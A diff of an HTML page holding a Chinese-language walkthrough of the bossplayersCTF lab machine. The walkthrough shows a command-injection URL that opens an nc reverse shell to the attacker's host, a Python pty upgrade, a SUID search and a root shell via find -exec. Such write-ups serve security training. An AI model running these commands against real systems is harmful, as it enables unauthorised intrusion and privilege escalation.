@@ -7543,7 +7543,7 @@
   <h1>bossplayersCTF</h1>
 
 <h2 id="bossplayersctf">bossplayersCTF</h2>
-<p>扫不到 IP 问题：
+<p>扫不到 IP 问题：<br />
 可以参考之前的文章：</p>
 <p>改了之后就扫到了</p>
 <p><img alt="image.png" src="../img/d0EmAjewI3y1ykqP/1591574739083-1259d69e-c26f-499d-8413-5609270cdeba-004231.png" /></p>
@@ -7556,11 +7556,11 @@
 <p><img alt="image.png" src="../img/d0EmAjewI3y1ykqP/1591575211272-5539210e-6028-4f1a-97c6-fdb0aaaeee89-584025.png" /></p>
 <p>kali 上面监听一下</p>
 <p><img alt="image.png" src="../img/d0EmAjewI3y1ykqP/1591575376624-40872441-22b5-4c6b-9689-0ff4c5a6bad7-652648.png" /></p>
-<p>访问一下：
+<p>访问一下：<br />
 <a href="http://192.168.149.173/workinginprogress.php?cmd=nc">http://192.168.149.173/workinginprogress.php?cmd=nc</a> -e /bin/sh 192.168.149.141 6666</p>
 <p><img alt="image.png" src="../img/d0EmAjewI3y1ykqP/1591575441105-4762bc50-cbf0-4039-aac4-c3339fa20291-438289.png" /></p>
 <p>python -c "import pty;pty.spawn('/bin/bash')" 打开一个交互 shell</p>
-<p>find / -user root -perm -4000 -print 2&gt;/dev/null
+<p>find / -user root -perm -4000 -print 2&gt;/dev/null<br />
 看一下哪一些程序用 root 权限运行的</p>
 <p><img alt="image.png" src="../img/d0EmAjewI3y1ykqP/1591576098070-cd26aef5-8371-426f-be20-b8145e182a88-945582.png" /></p>
 <p>find . -exec /bin/sh -p \; -quit</p>
